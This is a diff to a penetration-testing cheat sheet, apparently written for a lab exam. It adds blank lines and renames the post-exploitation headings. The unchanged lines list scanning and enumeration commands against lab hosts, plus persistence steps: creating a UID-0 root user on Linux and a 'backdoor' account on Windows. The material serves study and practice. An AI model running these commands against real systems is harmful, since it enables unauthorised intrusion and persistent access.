@@ -1,4 +1,5 @@
 ENUMERATION
+
     Host Discovery
        •  nmap -sn  10.11.1.1-254 -vv -oA hosts
        •  netdiscover -r 10.11.1.0/24
@@ -9,6 +10,7 @@ ENUMERATION
 -------------------------------------------------------------------------------------------------------------------------------------
 
 PORT
+
     Port Scanning & Service Detection
        • unicornscan -mT -I 10.11.1.252:a -v 
        • unicornscan -mU -I 10.11.1.252:p -v 
@@ -27,6 +29,8 @@ PORT
 -------------------------------------------------------------------------------------------------------------------------------------
 
 DNS
+
+
     Find DNS server:
        •  nslookup thinc.local 10.11.1.221
        • dig @10.11.1.221 thinc.local
@@ -50,6 +54,8 @@ DNS
 
 
 FTP
+
+
     Vulnerability Scanning
         • nmap -p 21 --script="+*ftp* and not brute and not dos and not fuzzer"  -vv -oN ftp $ip
 
@@ -60,6 +66,8 @@ FTP
 -------------------------------------------------------------------------------------------------------------------------------------
 
 FTP MANUAL SCANS
+
+
     Anonymous login
 
     Enumerate the hell out of the machine!
@@ -192,6 +200,8 @@ MYSQL
 
 
 RPC
+
+
     Find NFS Port
        •  nmap -p 111 --script=rpcinfo.nse -vv -oN nfs_port $ip
 
@@ -228,6 +238,8 @@ NFS
 
 
 POP3
+
+
     Enumerating user accounts
         • nc -nv $ip 25
             • VRFY user
@@ -306,6 +318,8 @@ DOMAIN
 
 
 FILE TRANSFER
+
+
     Simple Servers:
        •  pushd /fserver/ ; python -m SimpleHTTPServer 80 ; popd
        •  python -m pyftpdlib -p 21 -w -d /mnt
@@ -436,7 +450,7 @@ PSSWD CRACKING
 -------------------------------------------------------------------------------------------------------------------------------------
 
 
-POST LINUX
+POST EXPLOITATION LINUX
 
     Add user with root privs:
        •  sudo useradd -ou 0 -g 0 john
@@ -472,7 +486,7 @@ POST LINUX
 -------------------------------------------------------------------------------------------------------------------------------------
 
 
-POST WIN
+POST EXPLOITATION WINDOWS
 
     Backdoor User:
        •  net user backdoor backdoor@123 /add
